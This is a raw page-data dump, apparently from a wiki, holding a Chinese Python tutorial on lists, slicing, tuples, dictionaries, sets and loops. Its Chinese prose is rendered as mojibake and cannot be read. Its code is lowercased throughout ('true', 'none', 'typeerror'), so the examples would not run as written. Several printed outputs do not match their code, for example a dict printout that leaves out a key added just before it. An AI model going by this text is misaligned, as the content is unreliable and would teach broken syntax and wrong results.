[22, 13, 9, 11, 2, 10]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 9. åè¡¨å¤å¶\n    \n    # = å¤å¶å°åï¼list1ålist2æååä¸ä¸ªå°å\n    list1 = [1,2,3,4]\n    list2 = list1\n    \n    list2[0] = 0\n    print(list1) # [0, 2, 3, 4]\n    print(list2) # [0, 2, 3, 4]\n    \n    # æ¼ç©ºåè¡¨å¤å¶\n    list2 = []+list1\n    list2[0] = 10\n    print(list1) # [0, 2, 3, 4]\n    print(list2) # [10, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n\n\n# åè¡¨åç[]\n\nåçæ¯pythonä¸­çéè¦æä½ï¼åæ¶ä¹éç¨äºåè¡¨ãåç»ãå­ç¬¦ä¸²ãåçå¸¸è§çè¯­æ³æ ¼å¼æ¯ï¼\n\na[start:end:step]\n\nå¸åçæä½å¦ä¸ï¼\n\næä½åè¯´æ                                       ç¤ºä¾                               ç»æ\n[:]æåæ´ä¸ªåè¡¨                                   [10,20,30][:]                    [10,20,30]\n[start:]ä» start ç´¢å¼å¼å§å° ç»å°¾                    [10,20,30][1:]                   [20,30]\n[:end]ä»å¤´å¼å§ç¥é end-1                          [10,20,30][:2]                   [10,20]\n[start:end]ä» start å° end-1                  [10,20,30,40][1:3]               [20,30]\n[startðstep] ä» start æ åå° end-1ï¼æ­¥é¿æ¯ step   [10,20,30,40,50,60,70][1:6: 2]   [20, 40, 60]\n[10,20,30,40,50,60,70][-3:]                 åæ°ä¸ä¸ª                             [50,60,70]\n[10,20,30,40,50,60,70][-5:-3]               åæ°ç¬¬äºä¸ªå°åæ° ç¬¬ä¸ä¸ª(åå¤´ä¸åå°¾)              [30,40]\n[10,20,30,40,50,60,70][::-1]                æ­¥é¿ä¸ºè´ï¼ä»å³å°å·¦ ååæå                   [70, 60, 50, 40, 30, 20, 10]\n\nåçæä½æ¶å¦æç´¢å¼è¶çäºä¹ä¸ä¼æ¥éï¼å¦æstartå°äº0ä¼è¢«çä½0ï¼å¦æendå¤§äºlen-1ä¼è¢«çä½len-1ã\n\n\n# å¶ä»åè¡¨å½æ°\n\n 1. æ±æå¤§æå°å¼\n    \n    # max å minç¨äºæ±åè¡¨ä¸­çæå¤§æå°å¼\n    a = [1,2,3,4,5,6]\n    print(max(a)) # 6\n    print(min(a)) # 1\n    a = [1,\"a\",true]\n    print(max(a))\n    print(min(a)) # ä¸åç±»ååç´ æ¯è¾ä¼æ¥é\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 2. åç´ æ±å\n    \n    a = [1,2,3,4,5,6,7,8]\n    print(sum(a)) # 36\n    a = ['a',1,2,3,true]\n    print(sum(a)) # typeerror: unsupported operand type(s) for +: 'int' and 'str'\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# å¤ç»´åè¡¨\n\nä¸ç»´åè¡¨å¯ä»¥å¸®å©æä»¬å­å¨ä¸ç»´ãçº¿æ§çæ°æ®ã äºç»´åè¡¨å¯ä»¥å¸®å©æä»¬å­å¨äºç»´ãè¡¨æ ¼çæ°æ®ãäºç»´æ°ç»çç¬¬ä¸ä¸ªç»´åº¦ä¸­å­å¨äºäºç»´åº¦çåè¡¨èµ·å§å°åã\n\na = [\n    [1,2,3,4],\n    [2,3,4,5],\n    [5,6,7,8],\n    [6,7,8,9]\n]\nprint(a)\n\n# éåa\nfor i in range(4):\n    for j in range(4):\n        print(a[i][j],end=\"\\t\")\n    print()\n    \n\"\"\"\n1\t2\t3\t4\t\n2\t3\t4\t5\t\n5\t6\t7\t8\t\n6\t7\t8\t9\t\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# åç»\n\nåç»ååè¡¨ä¸ä¸æ ·ï¼åè¡¨æ¶å¯åçï¼å¯ä»¥ä¿®æ¹å é¤å¢å ãèåç»ä¸æ¦åå»ºäºå°±åºå®äºï¼æ²¡æåæ³å¢å æ¹ã\n\n\n# åå»ºåç»\n\n 1. éè¿æ¬å·åå»ºåç»\n    \n    # éè¿ï¼ï¼åå»ºåç»\n    a = (1,2,3,4)\n    b = 1,2,3,4\n    print(a) # (1, 2, 3, 4)\n    print(b) # (1, 2, 3, 4)\n    \n    # å¦æåç»ä¸­åªæä¸ä¸ªåç´ åå¿é¡»å ï¼\n    \n    a = (1)\n    print(type(a)) # <class 'int'>\n    a = (1,)\n    print(type(a)) # <class 'tuple'>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 2. éè¿tupleåå»ºåç»\n    \n    a = tuple() # ()\n    b = tuple(\"abc\") # ('a', 'b', 'c')\n    c = tuple(range(5)) # (0, 1, 2, 3, 4)\n    d = tuple([1,2,3,4,5]) # (1, 2, 3, 4, 5)\n    print(a)\n    print(b)\n    print(c)\n    print(d)\n    \n    # tupleä¸­å¯ä»¥æ¥ååè¡¨ãå­ç¬¦ä¸²ãå¶ä»åºåç±»åãè¿­ä»£å¨ç­ç¨äºçæåç»\n    # listä¸­å¯ä»¥æ¥ååç»ãå­ç¬¦ä¸²ãå¶ä»åºåç±»åãè¿­ä»£å¨ç­ç¨äºçæåè¡¨\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n    3. çæå¨æ¨å¯¼å¼åå»ºåç»\n    \n    è¿éççæå¨æ¨å¯¼å¼åä¸é¢çåè¡¨æ¨å¯¼å¼ç±»ä¼¼ï¼çæå¨æ¨å¯¼å¼ä½¿ç¨å°æ¬å·ãåè¡¨æ¨å¯¼å¼å¯ä»¥ç´æ¥çæåè¡¨å¯¹è±¡ï¼èçæå¨æ¨å¯¼å¼çæçæ¯ä¸ä¸ªçæå¨å¯¹è±¡ãæä»¬å°çæå¨æ¨å¯¼å¼ä½¿ç¨tupleçæåç»ï¼æèä½¿ç¨__next__()è¿è¡éåãåç´ è®¿é®ä¹åå°±ä¼è¢«å é¤ã\n    \n    s = (x*2 for x in range(10))\n    print(s) # <generator object <genexpr> at 0x7fafc00fdb60>\n    # print(list(s)) # [0, 2, 4, 6, 8, 10, 12, 14, 16, 18]\n    # print(tuple(s)) # (0, 2, 4, 6, 8, 10, 12, 14, 16, 18)\n    print(s.__next__()) # 0\n    print(s.__next__()) # 2\n    print(list(s)) # [4, 6, 8, 10, 12, 14, 16, 18]\n    print(tuple(s)) # ()\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    \n\n\n# åç´ è®¿é®åè®¡æ°\n\nåç»ä¸­çåç´ æ æ³ä¿®æ¹ï¼å¦æä¿®æ¹åä¼æ¥éã\n\na = tuple(range(10))\nprint(a[2]) # 2\na[2] = 3 # typeerror: 'tuple' object does not support item assignment\n\n\n1\n2\n3\n\n\nåç»çåçååè¡¨ä¸æ ·ï¼è¿åçæ¯åç»åçãä½¿ç¨åç½®çsortedæ¹æ³å¯ä»¥å¯¹çæåç»çæ°çæåºä¹åçåè¡¨å¯¹è±¡ã\n\na = tuple(range(10))\n\nprint(a[:8]) # (0, 1, 2, 3, 4, 5, 6, 7)\nprint(a[4:]) # (4, 5, 6, 7, 8, 9)\nprint(a[4:8]) # (4, 5, 6, 7)\nprint(a[4:8:2]) # (4, 6)\nprint(a[::-1]) # (9, 8, 7, 6, 5, 4, 3, 2, 1, 0)\nprint(a[-8:-2]) # (2, 3, 4, 5, 6, 7)\n\nb = sorted(a,reverse=true)\nprint(b) # [9, 8, 7, 6, 5, 4, 3, 2, 1, 0] \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nzipå½æ°å¯ä»¥å°å¤ä¸ªåè¡¨å¯¹åºä½ç½®çåç´ ç»åæä¸ºåç»ï¼å¹¶è¿åzipå¯¹è±¡ã\n\na = [1,2,3]\nb = [4,5,6]\nc = [7,8,9]\nd = zip(a,b,c)\nprint(d)  # <zip object at 0x7fa930060540>\nprint(list(d))  # [(1, 4, 7), (2, 5, 8), (3, 6, 9)]\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å­å¸\n\npythonä¸­çå­å¸ç±»ä¼¼äºjavaä¸­çmapç±»åãå­å¸æ¯é®å¼å¯¹çæ åºå¯åçåºåï¼å­å¸ä¸­çåç´ é½æ¯ä¸ä¸ªä¸ªçé®å¼å¯¹ãå¨å­å¸ä¸­ï¼å¯ä»¥éè¿æå®çé®å®ä½å°å¼å¯¹è±¡ãé®æ¯ä»»æçä¸å¯åå¯¹è±¡ï¼å¦æ´æ°ãæµ®ç¹æ°ãåç»ç­ç­ï¼åè¡¨ãå­å¸ãéåç­ä¸å¯ä½ä¸ºé®ãå­å¸çå®ä¹æ¹å¼å¦ä¸ï¼\n\na = {'hello':'world','time':'2022-11-22',12:'age'}\n\n\n1\n\n\n\n# åå»ºå­å¸\n\n 1. éè¿å¤§æ¬å·åå»ºå­å¸\n    \n    # {} åå»ºå­å¸\n    a = {'name':'zhangsan','age':12,11:12}\n    print(type(a)) # <class 'dict'>\n    \n    \n    1\n    2\n    3\n    \n\n 2. éè¿dict()åå»ºå­å¸\n    \n    # dictåå»ºå­å¸\n    a = dict(name='zhangsan',age=12)\n    b = dict([('name','zhangsan'),('age',12),(12,22)])\n    c = {}\n    d = dict()\n    print(a) # {'name': 'zhangsan', 'age': 12}\n    print(b) # {'name': 'zhangsan', 'age': 12, 12: 22}\n    print(c) # {}\n    print(d) # {}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 3. éè¿zip()åå»ºå­å¸\n    \n    k = ['name','age',12]\n    v = ['zhangsan','12',22]\n    d = dict(zip(k,v))\n    print(d)  # {'name': 'zhangsan', 'age': '12', 12: 22}\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. éè¿fromkeysåå»ºç©ºå¼å­å¸\n    \n    a = dict.fromkeys(['name','age',12])\n    print(a)\n    \n    \n    1\n    2\n    \n\n\n# å­å¸åç´ çè®¿é®\n\na = {'name':'zhangsan','age':18,'job':'it'}\nprint(a['name']) # zhangsan\n# print(a['sex'])  # keyerror: 'sex'\n\nprint(a.get('name')) # zhangsan\nprint(a.get('sex')) # none\nprint(a.get('sex','nan')) # nan è¿åä¸ä¸ªé»è®¤å¼\n\nprint(a.items()) # dict_items([('name', 'zhangsan'), ('age', 18), ('job', 'it')])\n\nprint(a.keys()) # dict_keys(['name', 'age', 'job'])\nprint(a.values()) # dict_values(['zhangsan', 18, 'it'])\n\nprint(len(a)) # 3\nprint('name' in a) # true\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# å­å¸å¢å æ¹\n\n 1. æ°å¢é®å¼å¯¹ï¼å­å¨åè¦ç\n    \n    a = {'name':'zhangsan','age':12,'sex':true}\n    a['birth'] = '2022-12-22'\n    print(a) # {'name': 'zhangsan', 'age': 12, 'sex': true, 'birth': '2022-12-22'}\n    a['name']='lisi'\n    print(a) # {'name': 'lisi', 'age': 12, 'sex': true}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 2. updateå°æ°å­å¸è¦çå°æ§å­å¸ä¸\n    \n    a = {'name':'zhangsan','age':12,'sex':true}\n    b = {'name':'wangwu','age':20,'sex':true,'birth':'20202222'}\n    a.update(b)\n    print(a) # {'name': 'wangwu', 'age': 20, 'sex': true, 'birth': '20202222'}\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. delæ¹æ³å é¤é®å¼å¯¹\n    \n    a = {'name':'zhangsan','age':12,'sex':true}\n    \n    del a['name']\n    print(a) # {'age': 12, 'sex': true}\t\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. clearæ¹æ³å é¤ææé®å¼å¯¹\n    \n    a.clear()\n    print(a) # {}\n    \n    \n    1\n    2\n    \n\n 5. popå é¤æå®é®å¼å¯¹\n    \n    b = a.pop(\"name\")\n    print(b) # zhangsan\n    print(a) # {'age': 12, 'sex': true}\n    \n    \n    1\n    2\n    3\n    \n\n 6. popiteméæ£å é¤è¿åé®å¼å¯¹\n    \n    b = a.popitem()\n    print(b) # ('sex', true)\n    print(a) # {'name': 'zhangsan', 'age': 12}\n    \n    \n    1\n    2\n    3\n    \n\n\n# è¯­æ³ç³ ä¹ åºåè§£å\n\nåºåè§£åå¯ä»¥å¾æ¹ä¾¿çå¸®å©æä»¬åæ¶ç»å¤ä¸ªåéèµå¼ãå¯ä»¥ä½ç¨äºåç»ãåè¡¨ãå­å¸ä¹ä¸ã\n\nx,y,z = (1,2,3)\nprint(x,y,z) # 1 2 3\n\n(a,b,c) = (3,4,5)\nprint(a,b,c) # 3 4 5\n\n[a,b,c,d] = [1,2,2,3]\nprint(a,b,c,d) # 1 2 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nåºåè§£ååæ¶å¯ä»¥ä½ç¨äºå­å¸ä¹ä¸ï¼å¦ææ¯å­å¸ï¼åé»è®¤æ¯key\n\na = {'name':'zhngsan','age':12,'sex':true}\nx,y,z = a\nprint(x,y,z) # name age sex\n\n\n1\n2\n3\n\n\nå¯ä»¥ä½¿ç¨å­å¸çitemsåvaluesè·åå°é®å¼å¯¹åºå\n\na = {'name':'zhngsan','age':12,'sex':true}\n\nx,y,z = a.items()\nprint(x,y,z) # ('name', 'zhngsan') ('age', 12) ('sex', true)\nx,y,z = a.values()\nprint(x,y,z) # zhngsan 12 true\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# åè¡¨ç»åå­å¸å­å¨åè®¿é®æ°æ®\n\nå§å    å¹´é¾   èªèµ      åå¸\né«å°ä¸   18   30000   åäº¬\né«å°äº   19   20000   ä¸æµ·\né«å°äº   20   10000   æ·±å³\n\nr1 = {\"name\":\"é«å°ä¸\",\"age\":18,\"salary\":30000,\"city\":\"åäº¬\"}\nr2 = {\"name\":\"é«å°äº\",\"age\":19,\"salary\":20000,\"city\":\"ä¸æµ·\"}\nr3 = {\"name\":\"é«å°äº\",\"age\":20,\"salary\":10000,\"city\":\"æ·±å³\"}\ntb = [r1,r2,r3]\n\n#è·å¾ç¬¬äºè¡çäººçèªèµ\nprint(tb[1].get(\"salary\"))\n#æå°è¡¨ä¸­ææççèªèµ\nfor i in range(len(tb)):\n  print(tb[i].get(\"salary\"))\n#æå°è¡¨çæææ°æ® for i in range(len(tb)):\n  print(tb[i].get(\"name\"),tb[i].get(\"age\"),tb[i].get(\"salary\"),tb[i].get(\"city\"))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# å­å¸åºå±åç\n\nå­å¸çæ ¸å¿å°±æ¯æ£åè¡¨ï¼æ£åè¡¨æ¯ä¸ä¸ªç¨çæ°ç»ï¼æ°ç»çååç§°ä¸ºbucketãæ¯ä¸ªbucketåå«ä¸¤ä¸ªé¨åï¼ä¸ä¸ªæ¯é®çå¼ç¨ï¼ä¸ä¸ªæ¯å¼çå¼ç¨ã\n\n# å¦ä½å°ä¸ä¸ªé®å¼å¯¹å­å¨å°å­å¸ä¸­\n\né¦åæ¯åå»ºä¸ä¸ªå­å¸ï¼ä¸ºå­å¸åéåå­ç©ºé´ï¼è¿éä¸ºæ¹ä¾¿è®¡ç®ï¼éç¨é¿åº¦ä¸º8ãç¶åè·åå°è¿ä¸ªé®å¼å¯¹çkeyçhashå¼ï¼ç¶åï¼å ä¸ºæ°ç»çé¿åº¦ä¸º8ï¼æä»¬åå³è¾¹3ä½åç§»éï¼è½¬åä¸ºå¯¹åºçåè¿å¶æ°æ®ï¼ç¶åæ¥çåç§»é5å¯¹åºçæ°ç»ä½ç½®ä¸æ¯ä¸æ¯ç©ºçï¼å¦ææ¯ï¼åå°é®å¼å¯¹æ¾å¥ãå¦æä¸æ¯åååå³åä¸ä½åç§»éãç´å°åç°ç©ºçbucketã\n\n# å¦ä½æ ¹æ®é®æ¥æ¾å¼\n\nå½æä»¬éè¦æ¥æ¾å¼çæ¶åï¼é¦åæ¯è·åå°é®çhashï¼å¦ææ°ç»é¿åº¦ä¸º8ï¼åè·åå³3ä½ä½ä¸ºåç§»éï¼ç¶åæ¥çå¯¹åºçä½ç½®æ¯å¦ä¸ºç©ºãå¦æä¸ºç©ºåè¿ånoneãå¦æä¸æ¯ç©ºï¼è®¡ç®è¿ä¸ªbucketçkeyçhashï¼æ¯è¾æ¯å¦åå½åæ¥è¯¢çé®çhashä¸è´ãå¦æä¸è´åè¿åå¼ãå¦æä¸ä¸è´ï¼åç»§ç»­åå³åä¸ä½è¿è¡æ¯è¾ï¼ç´å°æåï¼å¦ææ²¡æåç°ï¼è¿ånoneã\n\n\n# éå\n\néåæ¯æ åºçå¯ååºåï¼ä½æ¯åç´ ä¸è½éå¤ãç±»ä¼¼äºjavaä¸­çsetãéååºå±æ¯éè¿å­å¸å®ç°çãéåçææåç´ é½æ¯å­å¸çé®ï¼å æ­¤ä¸å¯éå¤ã\n\n\n# éåçç¸å³æä½\n\n 1. ä½¿ç¨å¤§æ¬å·åå»ºéå\n    \n    a = {1,2,3,'hello'}\n    print(a) #  {1, 2, 3, 'hello'}\n    print(type(a)) # <class 'set'>\n    \n    \n    1\n    2\n    3\n    \n\n 2. ä½¿ç¨setåå»ºéå\n    \n    a = [1,2,2,2,3,4]\n    b = set(a)\n    print(b) # {1, 2, 3, 4}\n    \n    \n    1\n    2\n    3\n    \n\n 3. ä½¿ç¨addæ·»å åç´ \n    \n    a = {}\n    print(type(a)) # <class 'dict'>\n    a = set()\n    print(type(a)) # <class 'set'>\n    a.add(1)\n    a.add(1)\n    print(a) # {1}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. ä½¿ç¨removeå é¤åç´ \n    \n    a = {1,2,3,4,5,6}\n    a.remove(1)\n    a.remove(2)\n    # a.remove(7) # keyerror: 7\n    print(a) # {3, 4, 5, 6}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 5. ä½¿ç¨clearæ¸ç©ºéå\n    \n    a = {1,2,3,4,5}\n    a.clear()\n    print(a) # set()\n    \n    \n    1\n    2\n    3\n    \n\n 6. éåçäº¤å·®å¹¶æä½\n    \n    a = {1,2,3,4}\n    b = {3,4,5,6}\n    print(a|b) # å¹¶ # {1, 2, 3, 4, 5, 6}\n    print(a&b) # äº¤ # {3, 4}\n    print(a - b) # å·® # {1, 2}\n    \n    print(a.union(b))# å¹¶ # {1, 2, 3, 4, 5, 6}\n    print(a.intersection(b))# äº¤ # {3, 4}\n    print(a.difference(b))# å·® # {1, 2}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n\n# åèèµæ\n\nå°å­¦å pythonæç¨ï¼https://www.bjsxt.com",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Pythonæµç¨æ§å¶çé£äºäº",frontmatter:{title:"Pythonæµç¨æ§å¶çé£äºäº",date:"2022-03-22T20:00:00.000Z",permalink:"/sec/dev/python/process",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/02.Python%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2020.Python/02.Pythonæµç¨æ§å¶çé£äºäº.md",key:"v-a9def288",path:"/sec/dev/python/process/",headers:[{level:2,title:"éæ©ç»æ",slug:"éæ©ç»æ",normalizedTitle:"éæ©ç»æ",charIndex:83},{level:3,title:"ååæ¯éæ©ç»æ",slug:"ååæ¯éæ©ç»æ",normalizedTitle:"ååæ¯éæ©ç»æ",charIndex:194},{level:3,title:"ååæ¯éæ©ç»æ",slug:"ååæ¯éæ©ç»æ",normalizedTitle:"ååæ¯éæ©ç»æ",charIndex:374},{level:3,title:"ä¸åè¿ç®ç¬¦",slug:"ä¸åè¿ç®ç¬¦",normalizedTitle:"ä¸åè¿ç®ç¬¦",charIndex:453},{level:3,title:"å¤åæ¯éæ©ç»æ",slug:"å¤åæ¯éæ©ç»æ",normalizedTitle:"å¤åæ¯éæ©ç»æ",charIndex:614},{level:3,title:"éæ©ç»æçåµå¥å³ç³»",slug:"éæ©ç»æçåµå¥å³ç³»",normalizedTitle:"éæ©ç»æçåµå¥å³ç³»",charIndex:783},{level:2,title:"å¾ªç¯ç»æ",slug:"å¾ªç¯ç»æ",normalizedTitle:"å¾ªç¯ç»æ",charIndex:88},{level:3,title:"whileå¾ªç¯",slug:"whileå¾ªç¯",normalizedTitle:"whileå¾ªç¯",charIndex:960},{level:3,title:"forå¾ªç¯",slug:"forå¾ªç¯",normalizedTitle:"forå¾ªç¯",charIndex:1014},{level:3,title:"rangeå¯¹è±¡",slug:"rangeå¯¹è±¡",normalizedTitle:"rangeå¯¹è±¡",charIndex:1344},{level:3,title:"breakè¯­å¥",slug:"breakè¯­å¥",normalizedTitle:"breakè¯­å¥",charIndex:1456},{level:3,title:"Continueè¯­å¥",slug:"continueè¯­å¥",normalizedTitle:"continueè¯­å¥",charIndex:1513},{level:3,title:"elseè¯­å¥",slug:"elseè¯­å¥",normalizedTitle:"elseè¯­å¥",charIndex:1581},{level:3,title:"å¾ªç¯çä¼å",slug:"å¾ªç¯çä¼å",normalizedTitle:"å¾ªç¯çä¼å",charIndex:1685},{level:3,title:"zip()å¹¶è¡è¿­ä»£",slug:"zip-å¹¶è¡è¿­ä»£",normalizedTitle:"zip()å¹¶è¡è¿­ä»£",charIndex:1810},{level:3,title:"æ¨å¯¼å¼åå»ºåºå",slug:"æ¨å¯¼å¼åå»ºåºå",normalizedTitle:"æ¨å¯¼å¼åå»ºåºå",charIndex:2159},{level:2,title:"åèèµæ",slug:"åèèµæ",normalizedTitle:"åèèµæ",charIndex:3242}],headersStr:"éæ©ç»æ ååæ¯éæ©ç»æ ååæ¯éæ©ç»æ ä¸åè¿ç®ç¬¦ å¤åæ¯éæ©ç»æ éæ©ç»æçåµå¥å³ç³» å¾ªç¯ç»æ whileå¾ªç¯ forå¾ªç¯ rangeå¯¹è±¡ breakè¯­å¥ Continueè¯­å¥ elseè¯­å¥ å¾ªç¯çä¼å zip()å¹¶è¡è¿­ä»£ æ¨å¯¼å¼åå»ºåºå åèèµæ",content:"# Pythonæµç¨æ§å¶é£äºäº\n\n> è®¡ç®æºå¨æ§è¡ç¨åºè§£å³é®é¢çæ¶åï¼éå¸¸æ§è¡ç¨åºçæµç¨åä¸ºä¸ç§ï¼é¡ºåºæ§è¡ãåæ¯éæ©ãå¾ªç¯æ§è¡ãå¯¹åºäºç¨åºè®¾è®¡ä¸­çä¸ä¸ªæµç¨ï¼é¡ºåºç»æãéæ©ç»æãå¾ªç¯ç»æãæ¬ç¯æ´çäºPythonä¸­çæµç¨æ§å¶ç¸å³äºå®ã\n\n\n# éæ©ç»æ\n\néæ©ç»ææ¯éè¿å¤æ­ç»å®çæ¡ä»¶æ¯å¦æç«ï¼å³å®æç»æ§è¡åªæ¡åæ¯ãéæ©ç»æåå¯ä»¥åä¸ºååæ¯ãååæ¯åå¤åæ¯ï¼å·ä½æµç¨å¾å¦ä¸æç¤ºï¼\n\n\n\n\n# ååæ¯éæ©ç»æ\n\nååæ¯çéæ©éå¸¸æ¯ä½¿ç¨ifè¯­å¥æ¥å®ç°çï¼ifè¯­å¥çè¯­æ³æ¯ï¼\n\nif æ¡ä»¶è¡¨è¾¾å¼:\n  è¯­å¥å\n\n\n1\n2\n\n\næ¡ä»¶è¡¨è¾¾å¼ï¼å¯ä»¥æ¯é»è¾ãç®æ°ãå³ç³»è¡¨è¾¾å¼ç­ç­ã\n\nè¯­å¥ãè¯­å¥åï¼å¯ä»¥æ¯ä¸æ¡è¯­å¥æèå¤æ¡è¯­å¥ã\n\næ¡ä»¶è¡¨è¾¾å¼ä¸ºFalseçæåµï¼Falseã0ã0.0ãNoneãç©ºçåºåå¯¹è±¡ãç©ºrangeãç©ºè¿­ä»£ãåºäºä¸è¿°æåµåä¸ºTrueã\n\n\n# ååæ¯éæ©ç»æ\n\nååæ¯éæ©ç»æå¨ifçåºç¡ä¹ä¸æ·»å äºelseï¼\n\nif æ¡ä»¶è¡¨è¾¾å¼:\n  \tè¯­å¥1\nelse:\n  \tè¯­å¥2\n\n\n1\n2\n3\n4\n\n\n\n# ä¸åè¿ç®ç¬¦\n\nPythonä¸­æä¾äºä¸åè¿ç®ç¬¦ï¼åJavaä¸­çç±»ä¼¼ï¼åªæ¯æå·®å¼ï¼\n\n# æ¡ä»¶è¡¨è¾¾å¼ä¸ºççå¼ if æ¡ä»¶è¡¨è¾¾å¼ else æ¡ä»¶è¡¨è¾¾å¼ä¸ºåçå¼\n\n# å¦æ age å¤§äº 18 æ¾ç¤ºæå¹´ å¦æä¸å¤§äºåæ¾ç¤º æªæå¹´\nprint(\"æå¹´\" if age > 18 else \"æªæå¹´\")\n\n\n1\n2\n3\n4\n\n\n\n# å¤åæ¯éæ©ç»æ\n\nå¤åæ¯éæ©ç»æå¨ååæ¯çåºç¡ä¸æ·»å äºelifçå¤æ­ï¼\n\nif æ¡ä»¶è¡¨è¾¾å¼ 1 :\n\tè¯­å¥ 1/è¯­å¥å 1 \nelif æ¡ä»¶è¡¨è¾¾å¼ 2:\n\tè¯­å¥ 2/è¯­å¥å 2 .\nelif æ¡ä»¶è¡¨è¾¾å¼ n:\n\tè¯­å¥ n/è¯­å¥å n \n[else:\n\tè¯­å¥ n+1/è¯­å¥å n+1 \n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# éæ©ç»æçåµå¥å³ç³»\n\néæ©ç»ææ¯å¯ä»¥è¿è¡åµå¥çï¼ä½æ¯å¨Pythonä¸­ç±äºä»£ç çå±çº§å³ç³»åä»£ç çç¼©ç´§æå³ï¼å æ­¤éè¦æ ¼å¤çæ³¨æä»£ç çç¼©è¿é®é¢ã\n\n\n# å¾ªç¯ç»æ\n\nå¾ªç¯ç»æå¯ä»¥éå¤çæ§è¡ç¹å®çä»£ç æèä»£ç çæ®µãå¾ªç¯ç»æçé»è¾æ¯ï¼å½ç¬¦åæç§æ¡ä»¶ï¼æ§è¡å¾ªç¯ä½çåå®¹ãæ¯æ¬¡æ§è¡å®ä¹åï¼åæ¬¡å¤æ­æ¯å¦æ»¡è¶³æ¡ä»¶ãPythonä¸­æwhileåforä¸¤ç§å¾ªç¯æ¹å¼ã\n\n\n# whileå¾ªç¯\n\nwhileå¾ªç¯çè¯­æ³ç»æï¼\n\nwhile æ¡ä»¶è¡¨è¾¾å¼:\n  å¾ªç¯ä½\n\n\n1\n2\n\n\n\n# forå¾ªç¯\n\nforå¾ªç¯éå¸¸ç¨äºéåå¯è¿­ä»£çå¯¹è±¡ï¼è¯­æ³æ ¼å¼å¦ä¸ï¼\n\nfor åé in å¯è¿­ä»£çå¯¹è±¡:\n  å¾ªç¯ä½\n\n\n1\n2\n\n\nå¨Pythonä¸­ï¼å¯è¿­ä»£çå¯¹è±¡åæ¬ï¼\n\n * åºåï¼å­ç¬¦ä¸²ãåè¡¨ãåç»\n * å­å¸\n * è¿­ä»£å¨å¯¹è±¡ï¼iterator\n * çæå¨å½æ°ï¼generator\n * æä»¶å¯¹è±¡\n\nä¸é¢å°±æ¥æ¼ç¤ºä¸ä¸å¦ä½éåä»¥ä¸çå¯¹è±¡ï¼\n\na = \"zhangsan .hello\"\nfor i in a:\n    print(i)\n\na = dict([('name','zhangsan'),('age',12)])\nfor k in a.keys():\n    print(k)\n\n    â¦â¦\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# rangeå¯¹è±¡\n\nrangeå¯¹è±¡æ¯ä¸ä¸ªè¿­ä»£å¨çå¯¹è±¡ï¼å¯ä»¥ç¨æ¥çææå®èå´çæ°å­çåºåï¼è¯­æ³æ ¼å¼ä¸ºï¼\n\nrange(start,end,step)\n\n\n1\n\n\nçæçå¼æ¯ä»startå¼å§ï¼å°end-1ï¼æ­¥é¿é»è®¤æ¯1ã\n\n\n# breakè¯­å¥\n\nbreakè¯­å¥ç¨äºç»ææ´ä¸ªå¾ªç¯ãå½æåµå¥å¾ªç¯å­å¨æ¶ï¼breakåªè½è·³åºæè¿çä¸å±å¾ªç¯ã\n\n\n# Continueè¯­å¥\n\ncontinueè¯­å¥ç¨äºç»ææ¬æ¬¡å¾ªç¯ï¼å¹¶ç»§ç»­æ§è¡å¤æ­ä¸ä¸æ¬¡å¾ªç¯ï¼å¦æç¬¦åå¾ªç¯çæ¡ä»¶ï¼åä¼ç»§ç»­æ§è¡å¾ªç¯ã\n\n\n# elseè¯­å¥\n\nå¨whileåforå¾ªç¯ä¸­å¯éä¸ä¸ªelseè¯­å¥ï¼è¿ä¸ªå¨å¶ä»çè¯­è¨ä¸­æ¯è¾å°è§ï¼å¦æforãwhileè¯­å¥æ²¡æè¢«breakè¯­å¥ç»æï¼åä¼æ§è¡elseè¯­å¥ï¼å¦ååä¸æ§è¡elseè¯­å¥çåå®¹ï¼\n\n\n# å¾ªç¯çä¼å\n\n 1. å°½éåå°å¾ªç¯åçä¸å¿è¦çè®¡ç®\n 2. åµå¥å¾ªç¯ä¸­ï¼å°½éåå°åå±å¾ªç¯çè®¡ç®\n 3. å±é¨åéçæ¥è¯¢éåº¦è¾å¿«ï¼ä¼åä½¿ç¨å±é¨åé\n 4. 